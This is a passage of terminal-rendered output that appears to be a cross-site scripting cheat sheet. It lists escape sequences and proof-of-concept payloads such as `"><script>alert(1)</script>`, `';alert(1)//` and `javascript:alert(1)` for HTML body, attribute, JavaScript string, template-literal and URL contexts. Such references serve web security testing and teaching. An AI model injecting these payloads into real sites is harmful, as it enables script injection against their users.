[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Context-Specific Escape Sequences                                        [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **HTML BODY:**                                                               [34m│[0m
[34m│[0m - Inject tags directly: `<script>`, `<img>`, `<svg>`                         [34m│[0m
[34m│[0m - No escaping needed                                                         [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **HTML ATTRIBUTE (double-quote):**                                           [34m│[0m
[34m│[0m - Escape with: `"`                                                           [34m│[0m
[34m│[0m - Then add event: `"onmouseover="alert(1)`                                   [34m│[0m
[34m│[0m - Or break tag: `"><script>alert(1)</script>`                                [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **HTML ATTRIBUTE (single-quote):**                                           [34m│[0m
[34m│[0m - Escape with: `'`                                                           [34m│[0m
[34m│[0m - Then: `'onmouseover='alert(1)`                                             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **JAVASCRIPT STRING (double-quote):**                                        [34m│[0m
[34m│[0m - Escape with: `"` or `\`                                                    [34m│[0m
[34m│[0m - Then: `";alert(1)//`                                                       [34m│[0m
[34m│[0m - Or inject: `</script><script>alert(1)</script>`                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **JAVASCRIPT STRING (single-quote):**                                        [34m│[0m
[34m│[0m - Escape with: `'` or `\`                                                    [34m│[0m
[34m│[0m - Then: `';alert(1)//`                                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **JAVASCRIPT TEMPLATE LITERAL:**                                             [34m│[0m
[34m│[0m - Escape with: `` ` `` or `${`                                               [34m│[0m
[34m│[0m - Then: `${alert(1)}` or `` `};alert(1)//` ``                                [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **JAVASCRIPT CONTEXT (no quotes):**                                          [34m│[0m
[34m│[0m ```javascript                                                                [34m│[0m
[34m│[0m -(confirm)(document.domain)//                                                [34m│[0m
[34m│[0m ; alert(1);//                                                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **URL CONTEXT (href):**                                                      [34m│[0m
[34m│[0m - Inject protocol: `javascript:alert(1)`                                     [34m│[0m
